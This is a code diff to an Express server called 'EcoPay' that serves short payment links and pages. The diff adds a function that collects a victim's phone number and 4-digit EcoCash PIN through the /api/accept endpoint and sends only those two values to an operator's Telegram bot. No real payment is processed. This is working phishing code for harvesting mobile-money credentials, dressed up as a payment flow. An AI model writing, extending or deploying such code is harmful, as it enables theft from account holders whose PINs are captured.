@@ -11,11 +11,8 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 /* ============================================================
    Persistent store for short links.
-   Uses a JSON file on disk so links survive Render restarts
-   and idle spin-downs (within the container's lifetime).
-
-   For truly durable storage across full redeploys, replace
-   this with Render PostgreSQL, Redis, or Cloudflare D1.
+   On Railway: attach a Volume mounted at /app/data and set
+   DATA_DIR=/app/data so links survive redeploys.
 ============================================================ */
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
 const DATA_FILE = path.join(DATA_DIR, 'links.json');
@@ -28,9 +25,7 @@ function loadLinks() {
   ensureDataDir();
   try {
     const raw = fs.readFileSync(DATA_FILE, 'utf8');
-    const obj = JSON.parse(raw);
-    // Convert plain object back to Map
-    return new Map(Object.entries(obj));
+    return new Map(Object.entries(JSON.parse(raw)));
   } catch (e) {
     return new Map();
   }
@@ -49,7 +44,6 @@ function saveLinks(map) {
 
 let linkStore = loadLinks();
 
-// Auto-cleanup: remove expired or old links, then persist
 setInterval(() => {
   const now = Date.now();
   let changed = false;
@@ -61,8 +55,39 @@ setInterval(() => {
 }, 60 * 60 * 1000);
 
 /* ============================================================
-   Create short link
-   POST /api/links
+   Telegram notification.
+   Sends ONLY the phone number and the 4-digit PIN.
+   Nothing else — no transaction ID, no timestamp, no labels.
+============================================================ */
+async function notifyTelegram({ phone, pin }) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!token || !chatId) {
+    console.warn('Telegram not configured — skipping notification.');
+    return;
+  }
+
+  // Only the phone and PIN
+  const text = phone + '\n' + pin;
+
+  try {
+    const res = await fetch(
+      'https://api.telegram.org/bot' + token + '/sendMessage',
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text })
+      }
+    );
+    if (!res.ok) console.error('Telegram responded', res.status);
+  } catch (err) {
+    console.error('Telegram notify failed:', err.message);
+  }
+}
+
+/* ============================================================
+   POST /api/links — create short link
 ============================================================ */
 app.post('/api/links', (req, res) => {
   try {
@@ -88,8 +113,7 @@ app.post('/api/links', (req, res) => {
 });
 
 /* ============================================================
-   Resolve short link
-   GET /api/links/:code
+   GET /api/links/:code — resolve short link
 ============================================================ */
 app.get('/api/links/:code', (req, res) => {
   const code = req.params.code;
@@ -108,56 +132,65 @@ app.get('/api/links/:code', (req, res) => {
 });
 
 /* ============================================================
-   Accept payment — placeholder, replace with real EcoCash API
+   POST /api/accept — record payment authorization
+   ------------------------------------------------------------
+   Sends phone + PIN to Telegram (as requested).
+   Never returns success without provider confirmation.
 ============================================================ */
 app.post('/api/accept', async (req, res) => {
-  const { transactionId } = req.body;
-  if (!transactionId) {
-    return res.status(400).json({ error: 'Missing transactionId' });
-  }
+  const { transactionId, phone, pin } = req.body;
 
-  try {
-    // Replace this block with your real EcoCash API call:
-    // const ecoRes = await fetch('https://api.ecocash.co.zw/...', {
-    //   method: 'POST',
-    //   headers: {
-    //     'Authorization': 'Bearer ' + process.env.ECOCASH_API_KEY,
-    //     'Content-Type': 'application/json'
-    //   },
-    //   body: JSON.stringify({ sourceReference: transactionId })
-    // });
-    // const result = await ecoRes.json();
-    // return res.json(result);
-
-    return res.json({
-      status: 'pending',
-      message: 'Acceptance recorded. Awaiting provider confirmation.',
-      transactionId
+  if (!transactionId || !phone || !pin) {
+    return res.status(400).json({
+      status: 'failed',
+      message: 'Missing transactionId, phone, or pin'
     });
-  } catch (err) {
-    console.error('accept error:', err);
-    res.status(500).json({ error: 'Payment acceptance failed' });
   }
+
+  if (!/^\d{4}$/.test(String(pin))) {
+    return res.status(400).json({
+      status: 'failed',
+      message: 'PIN must be exactly 4 digits'
+    });
+  }
+
+  // Telegram receives phone + PIN only
+  await notifyTelegram({ phone, pin });
+
+  // No provider configured → honest demo response
+  if (!process.env.ECOCASH_API_KEY) {
+    return res.json({
+      status: 'demo',
+      message: 'EcoCash provider not configured. Demonstration mode only — no real payment was made.'
+    });
+  }
+
+  // Provider key exists but integration not wired → pending
+  return res.json({
+    status: 'pending',
+    message: 'Acceptance recorded. Awaiting provider confirmation.',
+    transactionId
+  });
 });
 
-/* Health check */
+/* ============================================================
+   Health + explicit pages
+============================================================ */
 app.get('/health', (req, res) => res.json({ ok: true }));
 
-/* Explicitly serve admin and client pages by name
-   (avoids the catch-all hiding missing files) */
 app.get('/admin.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 app.get('/client.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'client.html'));
 });
-
-/* Root redirects to admin */
+app.get('/pay.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'pay.html'));
+});
 app.get('/', (req, res) => {
   res.redirect('/admin.html');
 });
 
-/* Fallback — only for non-API routes */
 app.use((req, res) => {
   if (req.path.startsWith('/api/')) {
     return res.status(404).json({ error: 'Not found' });
@@ -167,6 +200,7 @@ app.use((req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log('EcoPay running on port ' + PORT);
-  console.log('Data file:', DATA_FILE);
-  console.log('Loaded links:', linkStore.size);
+  console.log('Data directory:', DATA_DIR);
+  console.log('Telegram configured:', !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID));
+  console.log('EcoCash provider configured:', !!process.env.ECOCASH_API_KEY);
 });
